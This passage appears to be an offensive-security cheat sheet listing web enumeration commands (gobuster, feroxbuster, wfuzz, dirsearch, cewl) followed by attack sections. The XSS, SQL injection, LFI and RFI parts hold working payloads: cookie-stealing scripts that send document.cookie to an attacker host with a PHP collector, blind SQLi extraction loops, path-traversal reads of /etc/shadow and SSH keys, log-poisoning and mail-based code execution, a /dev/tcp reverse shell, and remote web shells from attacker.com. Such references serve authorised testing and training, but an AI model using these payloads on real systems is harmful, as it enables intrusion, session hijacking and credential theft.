| **DNS Subdomain Enumeration**   | ```gobuster dns -d example.com -w subdomains.txt```            | Discovers subdomains via DNS enumeration.                    | Found: admin.example.com                   |
| **Virtual Host Discovery**      | ```gobuster vhost -u http://example.com -w vhosts.txt```       | Enumerates virtual hosts on the server.                      | Found: dev.example.com (Status: 200)       |
| **S3 Bucket Enumeration**       | ```gobuster s3 -w bucket-names.txt```                          | Searches for accessible S3 buckets.                          | http://example-bucket.s3.amazonaws.com (Status: 200) |
| **Add Custom Headers**          | ```gobuster dir -u http://example.com -w wordlist.txt -H "X-Custom: value"``` | Adds custom HTTP headers to requests.                         | Using custom header: X-Custom              |
| **Use Proxy**                   | ```gobuster dir -u http://example.com -w wordlist.txt --proxy http://127.0.0.1:8080``` | Routes requests through a proxy.                             | Using proxy: http://127.0.0.1:8080         |
| **Recursive Scanning**          | ```gobuster dir -u http://example.com -w wordlist.txt -r```    | Enables recursive directory scanning.                        | http://example.com/admin/users (Status: 200) |
| **Wildcard Detection**          | ```gobuster dir -u http://example.com -w wordlist.txt --wildcard``` | Detects and handles wildcard responses.                       | Wildcard response detected: disabling wildcards |
| **Follow Redirects**            | ```gobuster dir -u http://example.com -w wordlist.txt -r```    | Follows HTTP redirects automatically.                        | http://example.com/old → http://example.com/new |
| **Set Threads**                 | ```gobuster dir -u http://example.com -w wordlist.txt -t 50``` | Sets the number of concurrent threads.                       | Using 50 threads                          |
| **Set Timeout**                 | ```gobuster dir -u http://example.com -w wordlist.txt --timeout 10s``` | Sets request timeout duration.                               | Timeout set to 10 seconds                  |
| **Exclude Length**              | ```gobuster dir -u http://example.com -w wordlist.txt --exclude-length 1234``` | Excludes responses with specific length.                     | Excluding responses of length 1234        |
| **Pattern Matching**            | ```gobuster dir -u http://example.com -w wordlist.txt -p pattern.txt``` | Uses pattern file for enumeration.                           | Using pattern file: pattern.txt           |
| **No Status Codes**             | ```gobuster dir -u http://example.com -w wordlist.txt -n```    | Disables status code display.                                | http://example.com/admin                  |
| **No Progress Bar**             | ```gobuster dir -u http://example.com -w wordlist.txt -q```    | Disables progress bar output.                                | http://example.com/admin (Status: 200)    |
| **Verbose Output**              | ```gobuster dir -u http://example.com -w wordlist.txt -v```    | Enables verbose output mode.                                 | [+] Mode: dir<br>[+] Url: http://example.com |
| **Output to File**              | ```gobuster dir -u http://example.com -w wordlist.txt -o output.txt``` | Saves results to a file.                                     | Results saved to output.txt               |
| **Username Enumeration**        | ```gobuster dir -u http://example.com -w wordlist.txt -U username -P password``` | Provides credentials for authentication.                     | Using basic authentication: username      |
| **User-Agent String**           | ```gobuster dir -u http://example.com -w wordlist.txt -a "Mozilla/5.0"``` | Sets custom User-Agent header.                                | Using User-Agent: Mozilla/5.0             |
| **Cookies**                     | ```gobuster dir -u http://example.com -w wordlist.txt -c "session=abc123"``` | Adds cookies to requests.                                     | Using cookies: session=abc123            |
| **No TLS Verification**         | ```gobuster dir -u https://example.com -w wordlist.txt -k```  | Skips TLS certificate verification.                           | Skipping TLS verification                 |
| **DNS Resolver**                | ```gobuster dns -d example.com -w wordlist.txt -r 8.8.8.8```  | Uses custom DNS resolver.                                     | Using DNS resolver: 8.8.8.8               |
| **Show IPs**                     | ```gobuster dns -d example.com -w wordlist.txt -i```         | Displays IP addresses in DNS mode.                            | admin.example.com [192.168.1.1]          |
| **Show CNAMEs**                 | ```gobuster dns -d example.com -w wordlist.txt --show-cname``` | Displays CNAME records in DNS mode.                           | www.example.com → cdn.example.com        |

### Examples

- ### Filter to show only 200 responses
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -s 200
> ```
- ### Specify extensions
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -x php,html,txt
> ```
- ### Save output to a file
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -o results.txt
> ```
- ### Set number of threads
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -t 50
> ```
- ### Use proxy
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -p http://127.0.0.1:8080
> ```
- ### Enumerate DNS: gather information about key servers within the domain
> ```bash
> gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
> ```

## Feroxbuster

| Command                             | Example Usage                                                                                   | Function                                                | Output Example                           |
|-------------------------------------|-------------------------------------------------------------------------------------------------|--------------------------------------------------------|------------------------------------------|
| **Basic Usage**                     | ```feroxbuster -u http://<IP Address>```                                                          | Performs directory brute-forcing                        | N/A                                      |
| **Silent Mode**                     | ```feroxbuster -u http://<IP Address> --silent```                                                  | Reduces output verbosity                               | N/A                                      |
| **Redirects**                        | ```feroxbuster -u http://<IP Address> -r```                                                      | Follows HTTP redirections                               | Redirects followed to http://<IP Address>/newpath |
| **File Extensions**                 | ```feroxbuster -u http://<IP Address> -x php,txt --silent```                                     | Fuzzes for specific file extensions                     | N/A                                      |
| **Result Output**                   | ```feroxbuster -u http://<IP Address> --output results.txt```                                     | Logs results to a file                                  | Results saved to results.txt             |
| **User-Agent**                      | ```feroxbuster -u http://<IP Address> -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"```            | Customizes the user-agent header                        | Using User-Agent: Mozilla/5.0           |
| **Filter Status Code**              | ```feroxbuster -u http://<IP Address> -C 403,404```                                              | Filters out specific status codes                        | Excluding 403, 404 status codes          |
| **Quiet Mode**                      | ```feroxbuster -u http://<IP Address> -q```                                                      | Suppresses progress bar and banner                      | Quiet mode enabled                       |
| **Controlling Threads**             | ```feroxbuster -u http://<IP Address> -t 20```                                                   | Limits concurrent threads                               | Using 20 threads                        |
| **Custom Wordlist**                 | ```feroxbuster -u http://<IP Address> -w /usr/share/wordlists/dirb/common.txt```                  | Uses a custom wordlist                                  | N/A                                      |
| **Disable Recursion**               | ```feroxbuster -u http://<IP Address> -n```                                                      | Disables recursive scanning                             | N/A                                      |
| **Limit Recursion Depth**           | ```feroxbuster -u http://<IP Address> -L 4```                                                    | Limits recursion depth                                  | Recursion depth set to 4                 |
| **Force Recursion**                 | ```feroxbuster -u http://<IP Address> --force-recursion```                                       | Forces recursion                                        | Recursion forced                         |
| **Filter by Character Size**        | ```feroxbuster -u http://<IP Address> -q -S 285,286,283,289```                                   | Filters by response size                                | Filtering response sizes: 285, 286, 283, 289 |
| **Filter by Number of Words**       | ```feroxbuster -u http://<IP Address> -q -W 33```                                                | Filters by number of words                              | Filtering results with 33 words          |
| **Filter by Number of Lines**       | ```feroxbuster -u http://<IP Address> -q -N 9```                                                 | Filters by number of lines                              | Filtering results with 9 lines           |
| **Filter Status Code (Deny List)**  | ```feroxbuster -u http://<IP Address> -q --filter-status 404```                                   | Deny list for status codes                              | Filtering out status code 404            |
| **Filter Status Code (Allow List)** | ```feroxbuster -u http://<IP Address> -q --status-codes 200,301```                                | Allow list for status codes                             | Allowing status codes 200, 301          |
| **Generate Random User-Agent**      | ```feroxbuster -u http://<IP Address> -A --burp```                                               | Uses random User-Agent for each request                 | Random User-Agent used                   |
| **HTTP Method**                     | ```feroxbuster -u http://<IP Address> -m POST```                                                 | Specifies the HTTP method to use                        | Using POST method                       |
| **Custom Headers**                  | ```feroxbuster -u http://<IP Address> -H 'Content-Type: application/x-www-form-urlencoded' --burp -q``` | Adds custom headers                                     | Using header Content-Type: application/x-www-form-urlencoded |
| **Cookies**                         | ```feroxbuster -u http://<IP Address> --cookies PHPSESSID=t54ij15l5d51i2tc7j1k1tu4p4 --burp -q```  | Sets cookies for the requests                           | Using cookies: PHPSESSID=t54ij15l5d51i2tc7j1k1tu4p4 |
| **Add Slash**                       | ```feroxbuster -u http://<IP Address> -f```                                                      | Appends a slash to each request                         | Adding slash to requests                 |
| **Capture Requests in Burp**        | ```feroxbuster -u http://<IP Address> --burp```                                                  | Captures requests for Burp Suite                        | Requests captured in Burp Suite          |
| **Read Target from List**           | ```cat target.txt | feroxbuster --stdin -q```                                                   | Reads target URLs from a list                            | N/A                                      |
| **Resume from Last State**          | ```feroxbuster --resume-from ferox-http_<IP Address>-1723370176.state -q```                       | Resumes scan from last saved state                       | Resuming from previous state            |
| **Follow Redirect**                 | ```feroxbuster -u http://<IP Address> -r```                                                      | Follows redirects during scanning                        | Following redirects                      |
| **Timeout**                         | ```feroxbuster -u http://<IP Address> -T 5```                                                    | Sets the timeout duration to 5 seconds                   | Timeout set to 5 seconds                 |

## Dirsearch

- ### Basic Directory scanning
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt
> ```
- ### Filter to show only 200 or 3xx responses
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -i 200,300-399
> ```
- ### Specify extensions
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -e php,html,txt
> ```
- ### Save Output to a file
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -r -o results.txt
> ```
- ### Set number of threads
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -t 50
> ```
- ### Use proxy
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -x http://127.0.0.1:8080
> ```
- ### Ignore SSL certification warnings
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -k
> ```
- ### Exclude specific status codes
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt --exclude-status 404,403
> ```

## WFUZZ

| Command                          | Example Usage                                                                                           | Function                              | Output Example                                              |
|----------------------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------|-------------------------------------------------------------|
| **Basic Fuzzing**                | `wfuzz -w wordlist.txt http://example.com/FUZZ`                                                          | Fuzzes directories                   | `000000001: 200 1234 L 45 W 12345 Ch "admin"`                |
| **Multiple Fuzz Points**         | `wfuzz -w list1.txt -w list2.txt http://example.com/FUZZ/FUZ2Z`                                          | Fuzzes two positions                 | `000000001: 200 50 L 20 W 5000 Ch "api" - "v1"`              |
| **POST Fuzzing**                 | `wfuzz -w wordlist.txt -d "user=admin&pass=FUZZ" http://example.com/login`                               | Fuzzes POST data                     | `000000001: 200 10 L 5 W 150 Ch "password123"`               |
| **Header Fuzzing**               | `wfuzz -w agents.txt -H "User-Agent: FUZZ" http://example.com/`                                          | Fuzzes User-Agent                    | `000000001: 200 100 L 50 W 10000 Ch "Mozilla/5.0..."`        |
| **Cookie Fuzzing**               | `wfuzz -w wordlist.txt -b "session=FUZZ" http://example.com/`                                            | Fuzzes cookie values                 | `000000001: 302 5 L 2 W 45 Ch "abc123def456"`                |
| **VHost Discovery**              | `wfuzz -w subdomains.txt -H "Host: FUZZ.example.com" http://192.168.1.10/`                              | Discovers virtual hosts              | `000000001: 200 200 L 100 W 20000 Ch "admin"`                |
| **Filter Status Code**           | `wfuzz -w wordlist.txt --sc 200 http://example.com/FUZZ`                                                 | Shows only 200 OK                    | `000000001: 200 50 L 25 W 5000 Ch "dashboard"`               |
| **Hide Status Code**             | `wfuzz -w wordlist.txt --hc 404 http://example.com/FUZZ`                                                | Hides 404 errors                     | `000000001: 200 30 L 15 W 3000 Ch "api"`                     |
| **Filter Length**                | `wfuzz -w wordlist.txt --sl 1000 http://example.com/FUZZ`                                               | Shows 1000-char responses            | `000000001: 200 50 L 25 W 1000 Ch "config"`                  |
| **Hide Length**                  | `wfuzz -w wordlist.txt --hl 4242 http://example.com/FUZZ`                                              | Hides 4242-byte responses            | `000000001: 200 100 L 50 W 10000 Ch "upload"`                |
| **Word Count Filter**            | `wfuzz -w wordlist.txt --sw 100 http://example.com/FUZZ`                                                | Shows 100-word responses             | `000000001: 200 20 L 100 W 2000 Ch "about"`                  |
| **Regex Filter**                 | `wfuzz -w wordlist.txt --ss "admin" http://example.com/FUZZ`                                           | Shows "admin" in response            | `000000001: 200 50 L 25 W 5000 Ch "panel"`                   |
| **Basic Auth**                   | `wfuzz -w passwords.txt --basic admin:FUZZ http://example.com/`                                          | Tests basic auth                     | `000000001: 200 10 L 5 W 500 Ch "P@ssw0rd"`                  |
| **Custom Method**                | `wfuzz -w wordlist.txt -X PUT http://example.com/FUZZ`                                                  | Uses PUT method                      | `000000001: 200 5 L 2 W 100 Ch "config"`                     |
| **Proxy Usage**                  | `wfuzz -w wordlist.txt -p 127.0.0.1:8080 http://example.com/FUZZ`                                      | Routes through proxy                 | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
| **Request Delay**                | `wfuzz -w wordlist.txt -s 2 http://example.com/FUZZ`                                                   | 2-second delay                       | `000000001: 200 50 L 25 W 5000 Ch "api"`                     |
| **Recursion**                    | `wfuzz -w wordlist.txt -R 2 http://example.com/FUZZ`                                                   | Recursive fuzzing                    | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
| **Follow Redirects**             | `wfuzz -w wordlist.txt --follow http://example.com/FUZZ`                                               | Follows redirects                    | `000000001: 200 50 L 25 W 5000 Ch "login" --> "/dashboard"`   |
| **Thread Count**                 | `wfuzz -w wordlist.txt -t 50 http://example.com/FUZZ`                                                  | Uses 50 threads                      | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
| **Output to File**               | `wfuzz -w wordlist.txt -f results.txt http://example.com/FUZZ`                                         | Saves to file                        | `Results saved to results.txt`                                |
| **JSON Output**                  | `wfuzz -w wordlist.txt -o json http://example.com/FUZZ`                                                | Outputs JSON                         | `{"url":"http://example.com/admin","code":200,"lines":50}`    |
| **Lines Filter**                 | `wfuzz -w wordlist.txt --sl 50 http://example.com/FUZZ`                                                | Shows 50-line responses              | `000000001: 200 50 L 25 W 5000 Ch "config"`                   |
| **Hide Lines**                   | `wfuzz -w wordlist.txt --hl 15 http://example.com/FUZZ`                                                | Hides 15-line responses              | `000000001: 200 50 L 25 W 5000 Ch "dashboard"`                |
| **Combined Filters**             | `wfuzz -w wordlist.txt --sc 200 --hl 4242 http://example.com/FUZZ`                                     | Multiple filters                      | `000000001: 200 50 L 25 W 5000 Ch "admin"`                    |

### Examples

| Command | Example Usage | Function | Output Example |
| ------- | ------------- | -------- | -------------- |
| Find available directories | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Fuzzes directories | |
| Find available directories with cookies | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: <cookie_name>=<cookie_value>" http://<IP-ADDRESS>/FUZZ ``` | Fuzzes directories with cookies | |
| Fuzz data parameters | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "id=FUZZ&catalogue=1" http://<IP-ADDRESS> ``` | Fuzzes data parameters | |
| Subdomain enumeration | ```bash wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.<TARGET_DOMAIN>" <TARGET_DOMAIN> ``` | Discovers subdomains | |
| Enumerate hidden directories | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/.FUZZ ``` | Enumerates hidden directories | |
| Skip SSL Certificate validation | ```bash wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Skips SSL validation | |
| Use threads to speed up | ```bash wfuzz --hc 404 -c -t <number of threads> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Uses threads to speed up | |
| To find number of columns (MySQL) | ```bash wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ" ``` | Finds number of columns in MySQL | |
| To find number of columns (MSSQL) | ```bash wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ" ``` | Finds number of columns in MSSQL | |
| Determine Database Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines database name via ASCII | |
| Determine Table Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines table name via ASCII | |
| Determine Column Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<TABLE_NAME>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines column name via ASCII | |
| Extract Column Content with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Extracts column content via ASCII | |

## Exposed .git

> 1. Clone [Git-Dumper](https://github.com/arthaud/git-dumper</a></body></html>)
> ```bash
> git clone https://github.com/arthaud/git-dumper</a></body></html>
> ```
> 2. Dump Content of an exposed .git directory
> ```bash
> git-dumper http://<IP-ADDRESS>/.git website_git
> ```
> 3. Search for common secrets
> ```bash
> grep -r ‘password’ .
>  grep -r ‘apikey’ .
> ```
> 4. View a specific file that may contain credentials or sensitive data
> ```bash
> cat website_git/config/database.php
> ```
> 5. Check the commit log
> ```bash
> git log
> ```
> 6. Check commit diff
> ```bash
> git show [commitID]
> ```
> 7. Show Git commits and reveal information
> ```bash
> sudo git show
> ```
> 8. Althernatively: Download the .git directory if exposed and move into the directory locally
> ```bash
> sudo wget -r http://<IP-ADDRESS/.git/
> ```

## Api

- ### Basic enumeration
> ```bash
> curl http://<IP-ADDRESS>/api
> ```
- ### Common API Pattern
> ```text
> /api_name/v1
> ```
- ### Use directory exploration techniques to further enumerate endpoints
> ```bash
> curl -x GET “http://[IP-ADDRESS]:[PORT]/search?query=*”
> ["query":"*","result:""}
> ```
> - Can change * to any type of query desired
- ### Use -d for data and -H for headers
> ```bash
> curl -d ‘{"password":"fake","username":"admin"}’ -H ‘Content-Type: application/json’ http://[IP-ADDRESS]:[PORT]/users/v1/login
> ```
- ### To use a proxy
> ```bash
> --proxy 127.0.0.1:8080
> ```

## IDOR

### Understanding IDOR (Insecure Direct Object Reference)

### What is IDOR?

In the context of web security, **IDOR** occurs when an attacker can directly access an object (such as a file or database entry) by manipulating a URL or HTTP request parameter, without proper access control checks. 

#### Example:

If a user uploads a file and gets a download link like: 

download.php?file_id=123

The file ID (`file_id=123`) directly references the file on the server. But what happens if the user tries to access a different file by modifying the `file_id` parameter in the URL?

download.php?file_id=124

If the server allows access to this file (`file_id=124`) without proper authorization checks, it indicates a **broken access control** vulnerability.

To identify IDOR vulnerabilities, it’s important to look for **URL parameters** or **APIs** that reference an object, such as:

- **URL Parameters**: `?uid=1` or `?filename=file_1.pdf`
- **Other HTTP Headers**: Sometimes, object references may appear in cookies.

When testing for IDOR, consider the following:

1. **Observe URLs and Parameters**: Check if any URL or request includes unique identifiers (UIDs) or file references that could be manipulated.
   
2. **Enumerate the Possible Values**: If the object reference (such as a file ID or user ID) follows a sequential pattern, we can **enumerate** values to access objects that don’t belong to us.

---

## Wordlists

**Some Useful Generators**

| Tool                           | GitHub URL                                                          |
|--------------------------------|---------------------------------------------------------------------|
| bopscrk                        | [https://github.com/R3nt0n/bopscrk](https://github.com/R3nt0n/bopscrk) |
| COOK                            | [https://github.com/giteshnxtlvl/cook](https://github.com/giteshnxtlvl/cook) |
| CUPP                            | [https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)       |
| Kerberos Username Enumeration  | [https://github.com/attackdebris/kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists) |
| Username Anarchy               | [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy) |

**Useful Wordlists**

- `/usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt`
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
- `/usr/share/seclists/Discovery/Web-Content/common.txt`
- `/usr/share/seclists/Discovery/Web-Content/big.txt`
- `/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`
- `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt`
- `/usr/share/wordlists/wfuzz/general/big.txt`

## Cewl

- To spider a site and write all found words to a file
> ```bash
> cewl -w <file> <url>
> ```

- To spider a site and follow links to other sites
> ```bash
> cewl -o <url>
> ```

- To spider a site using a given user-agent 
> ```bash
> cewl -u <user-agent> <url>
> ```

- To spider a site for a given depth and minimum word length
> ```bash
> cewl -d <depth> -m <min word length> <url>
> ```

- To spider a site and include a count for each word
> ```bash
> cewl -c <url>
> ```

- To spider a site inluding meta data and separate the meta_data words
> ```bash
> cewl -a -meta_file <file> <url>
> ```

- To spider a site and store email adresses in a separate file
> ```bash
> cewl -e -email_file <file> <url>
> ```

## Rules

| Rule   | Description                              | Example                        |
|--------|------------------------------------------|--------------------------------|
| `$1`   | Appends "1" to the end of the word       | `"password" → "password1"`     |
| `^`    | Prepends "1" to the word                 | `"password" → "1password"`     |
| `c`    | Capitalizes the first character of the word | `"password" → "Password"`     |
| `r`    | Reverses the word                        | `"password" → "drowssap"`      |
| `l`    | Converts the word to lowercase (if it’s not already) | `"PASSWORD" → "password"`     |
| `^c`   | Capitalizes the first letter and appends "123" | `"admin" → "Admin123"`        |

**Common Rules to use**

- best66.rule
- dive.rule
- toggles5.rule
- [OneRuleToRuleThemAll](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)

---

## XSS

# Common Characters to Find in Input Fields

- `<` 
- `>` 
- `'` 
- `"` 
- `{` 
- `}` 
- `;`

## Types of XSS Vulnerabilities

### Stored (Persistent)
- The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments).

### Reflected (Non-Persistent)
- Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message).

### DOM-Based
- Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags).

- Examples of Stored
> ```text
> <script>alert("XSS")</script>
> <script>alert(document.cookie)</script>
> <script>alert(window.origin)</script>
> ```

- Example of Reflected
> - Inject directly into the URL, most commonly, search pages as provided in the example
> ```text
> http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
> ```

- Example of Blind
> -A good way to test this is to see if we can retrieve files externally using the JavaScript code, we can use the payloads from PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc
> ```text
> <script src=http://[OUR_IP]></script>
> '><script src=http://[OUR_IP]></script>
> <script>$.getScript("http://[OUR_IP]")</script>
> "><script src=http://[OUR_IP]></script>
> javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
> <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
> ```

- Privilege Escalation using session hijacking
We need to make sure that the cookie is stored in the browser, we also need to consider that cookies can have two flags:

    Secure: only sends the cookie over an encrypted connection like HTTPS.
    HttpOnly: denies Javascript access to cookie; so we need that this options de disabled, you can check this in the Developer Tools of the browser.

After verifying that the cookie could be steal by its flags and having a valid XSS field we can use one of the following payloads:
Option 1

# Possible Payloads
> ```text
> document.location='http://OUR_IP/index.php?c='+document.cookie;
> or
> new Image().src='http://OUR_IP/index.php?c='+document.cookie;
> ```

# Access the Host
> ```text
> <script src=http://OUR_IP>/script.js</script>
> ```

Option2
# Payload
> ```text
> <img src=x onerror=fetch('http://10.10.14.37/'+document.cookie);>
> ```
# PHP Server Code
> ```php
> <?php
> if (isset($_GET['c'])) {
>     $list = explode(";", $_GET['c']);
>     foreach ($list as $key => $value) {
>         $cookie = urldecode($value);
>         $file = fopen("cookies.txt", "a+");
>         fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
>         fclose($file);
>     }
> }
> ?>
> ```

---

## LFI

- Basic example of an lfi
> ```text
> http://<target_url>/file.php?recurse=<file_name>
> ```

- URL encoding bypass
> ```text
>  http://<target_url>/file.php?recurse=../../../../../etc/passwd% 
> ```

- Null byte injection bypass
> ```text
> http://<target_url>/file.php?recurse=../../../../../etc/passwd?nullbyte
> ```

- Avoiding ..
> ```text
> http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
> http://<target_url>/file.php?recurse=.*/.*/.*/.*/.*/etc/passwd
> http://<target_url>/file.php?recurse=.?/.?/.?/.?/.?/etc/passwd
> ```

- Double URL encoding
> ```text
> http://<target_url>/file.php?recurse=%252e%252e%252fetc%252fpasswd
> ```

- Repeated slashes bypass
> ```text
> http://<target_url>/file.php?recurse=....//....//....//etc/passwd
> ```

- Viewing a file with null byte injection
> ```text
> http://<target_url>/file.php?recurse=../../../../../etc/passwd%00
> ```

- Bypass file extension restrictions
> ```text
> http://<target_url>/file.php?recurse=../../../../../etc/passwd%2500.jpg
> ```

- Retrieve system environment variables
> ```text
> http://<target_url>/file.php?recurse=../../../../../proc/self/environ
> ```

- Base64
> ```text
> http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>
> ```

- Decode base64-encoded output
> ```bash
> echo "<BASE64_ENCODED_OUTPUT>" | base64 -d
> ```
 
- ROT13
> ```text
> http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
> ```

- PHP
> ```bash
> curl "http://<TARGET>/index.php?page=php://filter/convert.base64-encode/resource=<FILE>"
> ```

### Log Poisoning (Apache or SSH Logs)
If log files such as /var/log/apache2/access.log or /var/log/auth.log are accessible through LFI, you can inject malicious code into the logs to achieve RCE.

- 1. Verify if log files can be accessed via LFI:
> ```text
> http://<target_url>/file.php?recurse=../../../../../var/log/apache2/access.log
> ```

- 2. Inject a malicious PHP payload into the logs via SSH:
> ```bash
> ssh "<?php system('whoami'); ?>"@<target>
> ```

- 3. Access the log file via LFI to execute the payload:
> ```text
> http://<target_url>/file.php?recurse=../../../../../var/log/auth.log
> ```

### Mail PHP Execution (RCE via Email)
Using LFI, after enumerating users (e.g., /etc/passwd), you can attempt to execute PHP code through a mail server by embedding PHP in email data.

- 1. Connect to the mail server:
> ```bash
> telnet <target_ip> 25
> ```
- 2. Inject PHP payload into the email service:
> ```php
> HELO localhost
> MAIL FROM:<root>
> RCPT TO:<www-data>
> DATA
> <?php echo shell_exec($_REQUEST['cmd']); ?>
> .
> ```
- **If unsure about the users on the system, perform user enumeration:**
> ```bash
> smtp-user-enum -M VRFY -U <username_list> -t <target_ip>
> ```

### Reverse Shell via LFI
You can use /proc/self/environ to inject a shell. If the environment variables are writable, inject PHP code into the environment.

- 1. Send the PHP payload:
> ```bash
> curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ
> ```

- 2. Access the file via LFI to trigger the reverse shell:
> ```text
> http://<target_url>/file.php?recurse=../../../../../proc/self/environ
> ```

## RFI

**Testing for RFI**

> # Step 1: Setup web server with malicious file
> # shell.txt content: <?php system($_GET['cmd']); ?>
> python3 -m http.server 8000
>
> # Step 2: Test RFI with your server
> page=http://your-server.com:8000/shell.txt
>
> # Step 3: Test different protocols
> page=http://attacker.com/shell.txt
> page=https://attacker.com/shell.txt
> page=ftp://attacker.com/shell.txt
> page=//attacker.com/shell.txt
>
> # Step 4: Execute commands if successful
> page=http://attacker.com/shell.txt&cmd=whoami

## Files and Paths for RFI and LFI

**For Linux**

| File Path                                  | Description                          |
|--------------------------------------------|--------------------------------------|
| /etc/apache2/apache2.conf                  | Apache config                        |
| /etc/apache2/sites-available/000-default.conf | Apache virtual host configuration   |
| /etc/group                                 | User groups                          |
| /etc/hosts                                 | DNS mappings                         |
| /etc/mysql/my.cnf                          | MySQL configuration                  |
| /etc/nginx/nginx.conf                      | Nginx config                         |
| /etc/passwd                                | Contains user accounts               |
| /etc/resolv.conf                           | DNS configuration                    |
| /etc/shadow                                | Stores hashed user passwords         |
| /etc/ssh/sshd_config                       | SSH configuration                    |
| /home/<user>/.bash_history                 | Command history                      |
| /home/<user>/.ssh/id_rsa                   | SSH private key                      |
| /proc/[PID]/cmdline                        | Other process command line           |
| /proc/[PID]/environ                        | Other process environment            |
| /proc/[PID]/fd/[0-9]*                      | Other process file descriptors       |
| /proc/devices                              | Device drivers                       |
| /proc/net/arp                              | ARP table                            |
| /proc/net/fib_trie                         | Routing table                        |
| /proc/net/tcp                              | TCP connections                      |
| /proc/net/udp                              | UDP connections                      |
| /proc/self/cmdline                         | Command line of current process      |
| /proc/self/environ                         | Environment variables (can contain session tokens) |
| /proc/self/exe                             | Executed binary                      |
| /proc/self/fd/[0-9]*                       | File descriptors                     |
| /proc/self/cwd                             | Current working directory            |
| /proc/self/stat                            | Process statistics                   |
| /proc/self/status                          | Process status                       |
